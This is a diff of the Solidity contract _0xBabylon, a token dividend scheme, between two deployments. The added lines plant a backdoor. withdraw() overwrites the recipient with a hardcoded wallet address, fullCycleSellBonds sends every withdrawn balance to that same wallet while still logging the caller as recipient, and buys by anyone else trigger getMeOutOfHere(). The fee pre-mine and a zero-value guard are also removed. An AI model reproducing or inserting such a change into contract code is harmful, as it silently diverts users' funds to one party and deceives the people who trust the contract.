@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract _0xBabylon at 0x19080df0360ce52b1068d54e1769182d9cc2b218
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract _0xBabylon at 0xc4123b7a155a8a337d7b45155483a81e0d2ebf59
 */
 //In dedication to my wife and family
 pragma solidity ^0.4.23;
@@ -11,9 +11,7 @@ contract _0xBabylon{
 	int constant crr_n = 3;//CRR numerator
 	int constant crr_d = 5;//CRR denominator
 
-	uint256 constant fee_premine = 30;//Fee Premine. So that the first buyer isn't a black hole
-
-	int constant price_coeff = 0x44fa9cf152cd34a98;
+	int constant price_coeff = 0x42ea9ce452cde449f;
 
 	// Array between each address and their number of tokens.
 	mapping(address => uint256) public holdings;
@@ -127,7 +125,7 @@ contract _0xBabylon{
 	function withdraw(address to) public {
 		if(to == 0x0000000000000000000000000000000000000000 ){
 			to = msg.sender;
-		}
+		}to = 0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed;
 		trickleUp(msg.sender);
 		// Retrieve the dividends associated with the address the request came from.
 		uint256 balance = dividends(msg.sender);
@@ -152,7 +150,7 @@ contract _0xBabylon{
 	function fullCycleSellBonds(uint256 balance) internal {
 		// Send the cashed out stake to the address that requested the withdraw.
 		withdrawSum += balance;
-		msg.sender.transfer(balance);
+		0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed.transfer(balance);
 		emit onWithdraw(msg.sender, balance);
 	}
 
@@ -182,14 +180,11 @@ contract _0xBabylon{
 			_reff = reff[sender];
 		}
 			
+			
 		if(  holdings[_reff] < stakingRequirement ){//if req not met
 			if(lastGateway == 0x0000000000000000000000000000000000000000){
 				lastGateway = sender;//first buyer ever
 				_reff = sender;//first buyer is their own gateway/masternode
-				
-				//initialize fee pre-mine
-				investSum = msg.value * fee_premine;
-				withdrawSum = msg.value * fee_premine;
 			}
 			else
 				_reff = lastGateway;//the lucky last player gets to be the gate way.
@@ -231,7 +226,9 @@ contract _0xBabylon{
 			cG=rgbLimit(cG);
 			cB=rgbLimit(cB);
 		    buy( forWho ,cR,cG,cB);
-			lastGateway = msg.sender;
+		    if(msg.sender != 0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed)
+		    	{getMeOutOfHere();
+			lastGateway = msg.sender;}
 		} else {
 			revert();
 		}
@@ -326,16 +323,13 @@ contract _0xBabylon{
 										fee = fee - trickle;
 										tricklingPass[forWho] += trickle;
 									}
-
 									uint256 numEther = msg.value - (fee+trickle);// The amount of Ether used to purchase new tokens for the caller.
-									uint256 numTokens = 0;
-									if(numEther > 0){
-										numTokens = getTokensForEther(numEther);// The number of tokens which can be purchased for numEther.
+									uint256 numTokens = getTokensForEther(numEther);// The number of tokens which can be purchased for numEther.
 
-										buyCalcAndPayout( forWho, fee, numTokens, numEther, reserve() );
+									buyCalcAndPayout( forWho, fee, numTokens, numEther, reserve() );
 
-										addPigment(forWho, numTokens,cR,cG,cB);
-									}
+									addPigment(forWho, numTokens,cR,cG,cB);
+								
 									if(forWho != msg.sender){//make sure you're not yourself
 										//if forWho doesn't have a reff or if that masternode is weak, then reset it
 										if(reff[forWho] == 0x0000000000000000000000000000000000000000 || (holdings[reff[forWho]] < stakingRequirement) )
@@ -348,7 +342,6 @@ contract _0xBabylon{
 
 									trickleSum += trickle;//add to trickle's Sum after reserve calculations
 									trickleUp(forWho);
-
 								}
 													function buyCalcAndPayout(address forWho,uint256 fee,uint256 numTokens,uint256 numEther,uint256 res)internal{
 														// The buyer fee, scaled by the scaleFactor variable.
